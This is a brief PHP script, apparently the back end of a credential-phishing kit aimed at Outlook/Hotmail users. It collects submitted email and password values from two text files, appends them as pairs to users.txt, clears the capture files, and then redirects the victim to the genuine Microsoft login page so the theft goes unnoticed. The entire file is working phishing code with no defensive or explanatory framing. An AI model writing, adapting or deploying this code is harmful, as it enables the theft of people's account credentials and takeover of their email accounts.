
<?php
// Ruta de los archivos
$emalFile = 'emal.txt';
$passwFile = 'passw.txt';
$usersFile = 'users.txt';

// Leer contenido de emal.txt y passw.txt
$emalContent = file_get_contents($emalFile);
$passwContent = file_get_contents($passwFile);

// Guardar contenido en users.txt
file_put_contents($usersFile, "Email: $emalContent\nPassword: $passwContent\n", FILE_APPEND);

// Limpiar contenido de emal.txt y passw.txt
file_put_contents($emalFile, '');
file_put_contents($passwFile, '');

echo 'Proceso completado correctamente.';
header('Location: https://login.live.com/login.srf?wa=wsignin1.0&rpsnv=20&ct=1705934326&rver=7.0.6738.0&wp=MBI_SSL&wreply=https%3a%2f%2foutlook.live.com%2fowa%2f%3fcobrandid%3dab0455a0-8d03-46b9-b18b-df2f57b9e44c%26nlp%3d1%26deeplink%3dowa%252f%253frealm%253dhotmail.com%26RpsCsrfState%3d6ec47277-13c4-5a28-5216-7e5bea77b41d&id=292841&aadredir=1&whr=hotmail.com&CBCXT=out&lw=1&fl=dob%2cflname%2cwld&cobrandid=ab0455a0-8d03-46b9-b18b-df2f57b9e44c');
?>
